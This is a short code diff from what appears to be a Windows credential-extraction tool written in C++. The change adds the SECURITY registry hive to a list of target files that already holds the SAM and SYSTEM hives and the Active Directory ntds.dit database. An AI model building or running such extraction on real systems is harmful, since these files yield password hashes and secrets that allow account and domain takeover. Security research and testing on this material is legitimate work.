@@ -116,7 +116,8 @@ int main() {
         std::vector<std::wstring> filesToExtract = {
             L"\\Windows\\System32\\config\\SAM",
             L"\\Windows\\System32\\config\\SYSTEM",
-            L"\\Windows\\NTDS\\ntds.dit"
+            L"\\Windows\\NTDS\\ntds.dit",
+            L"\\Windows\\System32\\config\\SECURITY"
         };
 
         std::wcout << L"[*] Searching for target files..." << std::endl;
